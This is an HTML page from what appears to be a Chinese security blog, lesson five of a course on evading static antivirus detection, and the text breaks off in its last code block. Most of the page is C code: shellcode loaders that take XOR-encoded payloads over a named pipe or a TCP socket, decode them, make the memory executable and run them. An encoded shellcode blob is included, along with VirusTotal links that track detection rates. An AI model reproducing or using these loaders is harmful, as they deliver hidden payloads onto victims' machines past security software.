@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>静态恶意代码逃逸（第五课）</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/projects/" title="Projects">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-terminal-fill" viewBox="0 0 16 16"><path d="M0 3a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3zm9.5 5.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 0-1zm-6.354-.354a.5.5 0 1 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708L4.793 6.5 3.146 8.146z"/></svg> Projects
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/tools/" title="Tools">
+                        Tools
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h2 id="0x01-真正意义上的分离">0x01 真正意义上的分离</h2>
+<p>前五课的代码将会上传至Github，方便读者下载研究 : <a href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></p>
+<p>将上一课的代码分离开编译，然后通过管道传输，让进程通信。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/61c9d3f728cda70fab2d1905d018df9f.png" alt="2019-11-10-02-08-49"></p>
+<p><a href="https://www.virustotal.com/gui/file/72db045fbb839a666a5cc2d13ea5a8282756014d80827a7343344e2d5387fe44/detection">https://www.virustotal.com/gui/file/72db045fbb839a666a5cc2d13ea5a8282756014d80827a7343344e2d5387fe44/detection</a></p>
+<p><a href="https://www.virustotal.com/gui/file/d31628050d943101ff108b9b070b48f97075e295e3797aec8ab8454cc19a3d88/detection">https://www.virustotal.com/gui/file/d31628050d943101ff108b9b070b48f97075e295e3797aec8ab8454cc19a3d88/detection</a></p>
+<p><strong>BadCodeWithPipe</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;intrin.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define BUFF_SIZE 1024
+</span><span style="color:#75715e"></span>
+PTCHAR ptsPipeName <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">pipe</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">BadCodeTest&#34;</span>);
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">wmain</span>(<span style="color:#66d9ef">int</span> argc, TCHAR <span style="color:#f92672">*</span> argv[]){
+
+    HANDLE hPipe;
+    DWORD dwError;
+    CHAR szBuffer[BUFF_SIZE];
+    DWORD dwLen;
+    PCHAR pszShellcode <span style="color:#f92672">=</span> NULL;
+    DWORD dwOldProtect; <span style="color:#75715e">// 内存页属性
+</span><span style="color:#75715e"></span>    HANDLE hThread;
+    DWORD dwThreadId;
+    <span style="color:#75715e">// 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea
+</span><span style="color:#75715e"></span>    hPipe <span style="color:#f92672">=</span> CreateNamedPipe(
+        ptsPipeName,
+        PIPE_ACCESS_INBOUND,
+        PIPE_TYPE_BYTE<span style="color:#f92672">|</span> PIPE_WAIT,
+        PIPE_UNLIMITED_INSTANCES,
+        BUFF_SIZE,
+        BUFF_SIZE,
+        <span style="color:#ae81ff">0</span>,
+        NULL);
+
+    <span style="color:#66d9ef">if</span>(hPipe <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
+        dwError <span style="color:#f92672">=</span> GetLastError();
+        printf(<span style="color:#e6db74">&#34;[-]Create Pipe Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
+        <span style="color:#66d9ef">return</span> dwError;
+    }
+
+    <span style="color:#66d9ef">if</span>(ConnectNamedPipe(hPipe,NULL) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>){
+        printf(<span style="color:#e6db74">&#34;[+]Client Connected...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        ReadFile(hPipe,szBuffer,BUFF_SIZE,<span style="color:#f92672">&amp;</span>dwLen,NULL);
+        printf(<span style="color:#e6db74">&#34;[+]Get DATA Length : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwLen);
+        <span style="color:#75715e">// 申请内存页
+</span><span style="color:#75715e"></span>        pszShellcode <span style="color:#f92672">=</span> (PCHAR)VirtualAlloc(NULL,dwLen,MEM_COMMIT,PAGE_READWRITE);
+        <span style="color:#75715e">// 拷贝内存
+</span><span style="color:#75715e"></span>        CopyMemory(pszShellcode,szBuffer,dwLen);
+
+        <span style="color:#66d9ef">for</span>(DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span> dwLen; i<span style="color:#f92672">++</span>){
+            Sleep(<span style="color:#ae81ff">50</span>);
+            _InterlockedXor8(pszShellcode<span style="color:#f92672">+</span>i,<span style="color:#ae81ff">10</span>);
+        }
+
+        <span style="color:#75715e">// 这里开始更改它的属性为可执行
+</span><span style="color:#75715e"></span>        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,<span style="color:#f92672">&amp;</span>dwOldProtect);
+        <span style="color:#75715e">// 执行Shellcode
+</span><span style="color:#75715e"></span>        hThread <span style="color:#f92672">=</span> CreateThread(
+            NULL, <span style="color:#75715e">// 安全描述符
+</span><span style="color:#75715e"></span>            NULL, <span style="color:#75715e">// 栈的大小
+</span><span style="color:#75715e"></span>            (LPTHREAD_START_ROUTINE)pszShellcode, <span style="color:#75715e">// 函数
+</span><span style="color:#75715e"></span>            NULL, <span style="color:#75715e">// 参数
+</span><span style="color:#75715e"></span>            NULL, <span style="color:#75715e">// 线程标志
+</span><span style="color:#75715e"></span>            <span style="color:#f92672">&amp;</span>dwThreadId <span style="color:#75715e">// 线程ID
+</span><span style="color:#75715e"></span>        );
+
+        WaitForSingleObject(hThread,INFINITE);
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p><strong>BadCodePipeClient</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;intrin.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define BUFF_SIZE 1024
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> buf[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a</span><span style="color:#e6db74">&#34;</span>;
+PTCHAR ptsPipeName <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">pipe</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">BadCodeTest&#34;</span>);
+
+
+BOOL <span style="color:#a6e22e">RecvShellcode</span>(VOID){
+    HANDLE hPipeClient;
+    DWORD dwWritten;
+    DWORD dwShellcodeSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(buf);
+    <span style="color:#75715e">// 等待管道可用
+</span><span style="color:#75715e"></span>    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);
+    <span style="color:#75715e">// 连接管道
+</span><span style="color:#75715e"></span>    hPipeClient <span style="color:#f92672">=</span> CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,NULL);
+
+    <span style="color:#66d9ef">if</span>(hPipeClient <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
+        printf(<span style="color:#e6db74">&#34;[+]Can&#39;t Open Pipe , Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,GetLastError());
+        <span style="color:#66d9ef">return</span> FALSE;
+    }
+
+    WriteFile(hPipeClient,buf,dwShellcodeSize,<span style="color:#f92672">&amp;</span>dwWritten,NULL);
+    <span style="color:#66d9ef">if</span>(dwWritten <span style="color:#f92672">==</span> dwShellcodeSize){
+        CloseHandle(hPipeClient);
+        printf(<span style="color:#e6db74">&#34;[+]Send Success ! Shellcode : %d Bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwShellcodeSize);
+        <span style="color:#66d9ef">return</span> TRUE;
+    }
+    CloseHandle(hPipeClient);
+    <span style="color:#66d9ef">return</span> FALSE;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">wmain</span>(<span style="color:#66d9ef">int</span> argc, TCHAR <span style="color:#f92672">*</span> argv[]){
+
+    RecvShellcode();
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><h2 id="0x02-网络套接字socket">0x02 网络套接字（SOCKET）</h2>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1a40f881fa1acfbe75f302bfff33a013.png" alt="2019-11-10-02-09-50"></p>
+<p>通过建立一个客户端和服务端，进行Shellcode的收发，类似于Java中的反序列化。</p>
+<p><strong>服务端</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;WinSock2.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;intrin.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#pragma comment(lib,&#34;ws2_32.lib&#34;)
+</span><span style="color:#75715e"></span>
+BOOL <span style="color:#a6e22e">RunCode</span>(CHAR <span style="color:#f92672">*</span> code,DWORD dwCodeLen)
+{
+    HANDLE hThread;
+    DWORD dwOldProtect;
+    DWORD dwThreadId;
+    PCHAR pszShellcode <span style="color:#f92672">=</span> (PCHAR)VirtualAlloc(NULL,dwCodeLen,MEM_COMMIT,PAGE_READWRITE);
+    CopyMemory(pszShellcode,code,dwCodeLen);
+
+    <span style="color:#66d9ef">for</span>(DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span> dwCodeLen; i<span style="color:#f92672">++</span>){
+            _InterlockedXor8(pszShellcode<span style="color:#f92672">+</span>i,<span style="color:#ae81ff">10</span>);
+    }
+    <span style="color:#75715e">// 这里开始更改它的属性为可执行
+</span><span style="color:#75715e"></span>        VirtualProtect(pszShellcode,dwCodeLen,PAGE_EXECUTE,<span style="color:#f92672">&amp;</span>dwOldProtect);
+        <span style="color:#75715e">// 执行Shellcode
+</span><span style="color:#75715e"></span>        hThread <span style="color:#f92672">=</span> CreateThread(
+            NULL, <span style="color:#75715e">// 安全描述符
+</span><span style="color:#75715e"></span>            NULL, <span style="color:#75715e">// 栈的大小
+</span><span style="color:#75715e"></span>            (LPTHREAD_START_ROUTINE)pszShellcode, <span style="color:#75715e">// 函数
+</span><span style="color:#75715e"></span>            NULL, <span style="color:#75715e">// 参数
+</span><span style="color:#75715e"></span>            NULL, <span style="color:#75715e">// 线程标志
+</span><span style="color:#75715e"></span>            <span style="color:#f92672">&amp;</span>dwThreadId <span style="color:#75715e">// 线程ID
+</span><span style="color:#75715e"></span>        );
+        WaitForSingleObject(hThread,INFINITE);
+        <span style="color:#66d9ef">return</span> TRUE;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">wmain</span>(<span style="color:#66d9ef">int</span> argc, TCHAR argv[]){
+    CHAR buf[<span style="color:#ae81ff">801</span>];
+    DWORD dwError;
+    WORD sockVersion <span style="color:#f92672">=</span> MAKEWORD(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>);
+    WSADATA wsaData;
+    SOCKET socks;
+    SOCKET sClient;
+    <span style="color:#66d9ef">struct</span> sockaddr_in s_client;
+    INT nAddrLen <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(s_client);
+    SHORT sListenPort <span style="color:#f92672">=</span> <span style="color:#ae81ff">8888</span>;
+    <span style="color:#66d9ef">struct</span> sockaddr_in sin;
+
+    <span style="color:#66d9ef">if</span> (WSAStartup(sockVersion, <span style="color:#f92672">&amp;</span>wsaData) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+    {
+        dwError <span style="color:#f92672">=</span> GetLastError();
+        printf(<span style="color:#e6db74">&#34;[*]WSAStarup Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
+        <span style="color:#66d9ef">return</span> dwError;
+    }
+
+    socks <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+    <span style="color:#66d9ef">if</span> (socks <span style="color:#f92672">==</span> INVALID_SOCKET)
+    {
+        dwError <span style="color:#f92672">=</span> GetLastError();
+        printf(<span style="color:#e6db74">&#34;[*]Socket Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
+        <span style="color:#66d9ef">return</span> dwError;
+    }
+
+    sin.sin_family <span style="color:#f92672">=</span> AF_INET;
+    sin.sin_port <span style="color:#f92672">=</span> htons(sListenPort);
+    sin.sin_addr.S_un.S_addr <span style="color:#f92672">=</span> INADDR_ANY;
+
+    <span style="color:#66d9ef">if</span>(bind(socks,(<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sin,<span style="color:#66d9ef">sizeof</span>(sin)) <span style="color:#f92672">==</span> SOCKET_ERROR )
+    {
+        dwError <span style="color:#f92672">=</span> GetLastError();
+        printf(<span style="color:#e6db74">&#34;[*]Bind Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
+        <span style="color:#66d9ef">return</span> dwError;
+    }
+
+    <span style="color:#66d9ef">if</span> (listen(socks, <span style="color:#ae81ff">5</span>) <span style="color:#f92672">==</span> SOCKET_ERROR)
+    {
+        dwError <span style="color:#f92672">=</span> GetLastError();
+        printf(<span style="color:#e6db74">&#34;[*]Listen  Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
+        <span style="color:#66d9ef">return</span> dwError;
+    }
+
+    sClient <span style="color:#f92672">=</span> accept(socks, (SOCKADDR <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>s_client, <span style="color:#f92672">&amp;</span>nAddrLen);
+    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> recv(sClient,buf,<span style="color:#66d9ef">sizeof</span>(buf),<span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+    {
+        printf(<span style="color:#e6db74">&#34;[+]Recv %d-Bytes </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,ret);
+        closesocket(sClient);
+        closesocket(socks);
+    }
+
+    WSACleanup();
+    RunCode(buf,<span style="color:#66d9ef">sizeof</span>(buf));
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/10b60659fff4172d335c0bc25608f8c0.png" alt="2019-11-10-02-10-24"></p>
+<p><a href="https://www.virustotal.com/gui/file/3dbef953e7bb0839d7abe9db7003bdad6ac7d7b0581ea7fd2b5131e79034e4b2/detection">https://www.virustotal.com/gui/file/3dbef953e7bb0839d7abe9db7003bdad6ac7d7b0581ea7fd2b5131e79034e4b2/detection</a></p>
+<p><strong>客户端</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;WinSock2.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;intrin.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#pragma comment(lib,&#34;ws2_32.lib&#34;)
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> buf[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x